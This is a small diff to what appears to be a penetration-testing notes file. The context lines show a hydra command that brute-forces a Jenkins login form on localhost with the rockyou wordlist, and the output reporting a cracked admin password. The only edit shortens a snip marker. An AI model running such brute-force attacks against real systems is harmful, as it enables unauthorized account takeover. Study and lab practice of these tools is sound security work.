@@ -129,7 +129,7 @@ Search for domains that are about to expire or are already expired.
 
 ```plain
 $ hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt            
-[...SNIP...]
+[...]
 [ATTEMPT] target 127.0.0.1 - login "admin" - pass "hottie1" - 556 of 14344399 [child 8] (0/0)
 [8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
 [STATUS] attack finished for 127.0.0.1 (valid pair found)
